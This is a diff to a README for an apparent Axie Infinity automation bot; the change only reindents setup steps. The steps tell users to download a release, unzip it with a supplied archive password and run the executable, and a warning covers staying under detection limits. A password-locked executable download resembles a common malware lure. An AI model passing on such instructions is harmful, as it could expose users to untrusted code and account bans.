@@ -50,15 +50,15 @@ Usage: The bot analyzes specific pixels in the captured screenshot to identify A
 
 ### Setup
 - Configure Game Resolution:
-- - Set the Axie Infinity game resolution to full-screen (or full-screen windowed) mode.
-- - Close the SkyMavis game client to ensure the bot can access the game window without interference.
+ - Set the Axie Infinity game resolution to full-screen (or full-screen windowed) mode.
+ - Close the SkyMavis game client to ensure the bot can access the game window without interference.
 
 - Download and Extract Files:
-- - Download the latest release of the repository.
-- - Extract the downloaded files using the password QaURPee9bNthgl.
+ - Download the latest release of the repository.
+ - Extract the downloaded files using the password QaURPee9bNthgl.
 
 - Launch the Bot:
-- - Run the bot executable with the correct settings configured in the provided configuration file. Ensure the game client is running and visible on your screen.
+ - Run the bot executable with the correct settings configured in the provided configuration file. Ensure the game client is running and visible on your screen.
 
 ### Warning
 Usage Limitations: It is not recommended to run the bot for more than 24 hours per account. Extended use may increase the risk of detection and account suspension.
